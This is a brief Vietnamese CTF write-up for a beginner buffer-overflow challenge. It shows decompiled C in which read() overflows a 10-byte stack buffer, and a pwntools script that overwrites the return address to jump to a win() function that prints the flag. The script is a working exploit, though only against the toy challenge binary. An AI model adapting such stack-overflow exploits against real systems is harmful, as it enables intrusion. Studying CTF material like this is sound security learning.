# Simple

Đúng như tên, rất simple

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Helloooooo, do you like to build snowmen?");
  read(0, buf, 0x64uLL);
  if ( !strcmp(buf, "yes") )
    puts("Me too! Let's build one!");
  else
    puts("Mhmmm... Boring...");
  return 0LL;
}
```

```c
int win()
{
  return puts("FFLAG{REAL FLAG ON THE SERVER}");
}
```

`read(0, buf, 0x64uLL);` có thể control được saved RIP của hàm main. Ta sẽ cho return đến hàm win để có được flag.

```python
from pwn import *
# host = ''
# port = 0
p = process('./snoverflow')
# p = remote(host,port)
payload = b'a' * 18
payload += p64(0x401156)

p.sendlineafter(b'snowmen?\n',payload)
p.recvuntil(b'Boring...\n')
print(p.recvline()[:-1].decode())
p.close()
```